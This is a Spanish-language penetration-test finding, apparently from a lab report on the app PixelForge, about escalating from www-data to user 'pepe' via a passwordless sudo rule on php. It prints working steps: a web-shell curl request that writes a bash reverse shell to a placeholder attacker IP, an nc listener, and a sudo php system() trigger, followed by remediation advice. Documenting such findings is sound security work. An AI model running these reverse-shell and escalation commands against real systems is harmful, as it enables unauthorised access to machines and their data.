# 🔓 F-016 — Escalada de privilegios local (www-data → pepe) por regla sudo mal configurada

![Severidad](https://img.shields.io/badge/severidad-alto-important) ![CVSS](https://img.shields.io/badge/CVSS-7.8-orange) ![CWE](https://img.shields.io/badge/CWE-269-blue) ![App](https://img.shields.io/badge/app-PixelForge-purple)

> [!IMPORTANT]
> Con el RCE ya obtenido como `www-data`, una regla `sudo` sin contraseña sobre el intérprete `php` permite saltar directamente a un usuario con shell real — `php` está catalogado en GTFOBins como vector clásico de escalada vía `sudo`.

## 📖 Contexto

Con la ejecución de comandos obtenida en [F-013](F-013-subida-fichero-rce.md) (usuario `www-data`, cuenta de servicio sin shell de login), el siguiente paso natural de post-explotación es comprobar privilegios `sudo`.

## 🔬 Explotación paso a paso

**1. Comprobar privilegios:**

```bash
sudo -l
```

```
Matching Defaults entries for www-data on 8f74d00e817f:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin, use_pty

User www-data may run the following commands on 8f74d00e817f:
    (pepe) NOPASSWD: /usr/bin/php
```

`www-data` puede ejecutar `/usr/bin/php` como el usuario `pepe`, **sin contraseña**. `php` es un intérprete de propósito general catalogado en [GTFOBins](https://gtfobins.github.io/gtfobins/php/#sudo) como vector de escalada vía `sudo`: al poder ejecutar código PHP arbitrario con los permisos de `pepe`, basta con llamar a `system()`/`exec()` desde ese código para obtener ejecución de comandos como ese usuario.

A diferencia de `www-data`, `pepe` tiene un shell real (`/bin/bash`) y pertenece al grupo adicional `workers` — más superficie de acceso al sistema de ficheros.

**2. Escribir un script de reverse shell** (como `www-data`, sin necesidad de `sudo` todavía):

```bash
curl -s "http://172.17.0.2:10000/uploads/pixelforge_avatar_rce_shell.php" -G \
  --data-urlencode "cmd=echo 'bash -i >& /dev/tcp/<IP-ATACANTE>/4444 0>&1' > /tmp/rs.sh"
```

**3. Levantar el listener en la máquina atacante:**

```bash
nc -lvnp 4444
```

**4. Disparar el script como `pepe`, abusando de la regla `sudo`:**

```bash
curl -s "http://172.17.0.2:10000/uploads/pixelforge_avatar_rce_shell.php" -G \
  --data-urlencode "cmd=sudo -u pepe /usr/bin/php -r 'system(\"bash /tmp/rs.sh\");'"
```

**Resultado:** conexión entrante en el listener con un shell interactivo como `pepe`:

```
Connection received on 172.17.0.2 59394
pepe@8f74d00e817f:/var/www/gamestore/uploads$
```

Con `python3 -c 'import pty; pty.spawn("/bin/bash")'` se estabiliza el shell (TTY real), necesario para que comandos como `sudo -l` funcionen correctamente a partir de aquí.

**Límite de esta escalada:** se intentó escalar más allá (`sudo -l` como `pepe`) sin éxito — `pepe` no tiene reglas `NOPASSWD` propias, así que esta cadena concreta se detiene aquí (no se alcanzó `root`).

## 💥 Impacto

> [!CAUTION]
> Convierte el RCE como `www-data` en acceso como un usuario con shell de login real y más privilegios de lectura sobre el sistema de ficheros. Este acceso fue la puerta de entrada directa a [F-017 — Secretos en texto plano](F-017-secretos-credenciales-config-php.md) y [F-018 — Toma de cuenta vía tokens filtrados](F-018-toma-cuenta-tokens-mail-log.md).

## 🛡️ Remediación

- No conceder reglas `sudo` sin contraseña sobre intérpretes de propósito general (`php`, `python`, `perl`, `ruby`, etc.) catalogados en GTFOBins — son, por diseño, equivalentes a dar una shell completa como el usuario objetivo.
- Si `www-data` necesita ejecutar lógica como `pepe` (p. ej. un cron de mantenimiento), restringir la regla a un script concreto y no modificable por `www-data`, nunca al intérprete en abierto.
- Revisar por qué `www-data` necesita `sudo` en absoluto — en la mayoría de arquitecturas web no debería tener ninguna regla.

## 🔗 Hallazgos relacionados

- [F-013 — Subida de fichero sin restricciones → RCE](F-013-subida-fichero-rce.md): el RCE inicial como `www-data` que hizo posible esta escalada.
- [F-017 — Secretos y credenciales en texto plano](F-017-secretos-credenciales-config-php.md) y [F-018 — Toma de cuenta vía tokens filtrados](F-018-toma-cuenta-tokens-mail-log.md): lo que se alcanzó desde este shell como `pepe`.

---
⬅ [Volver al índice de writeups](README.md) · [README principal](../README.md) · [Informe técnico (PDF)](../docs/informe-BigShop.pdf)
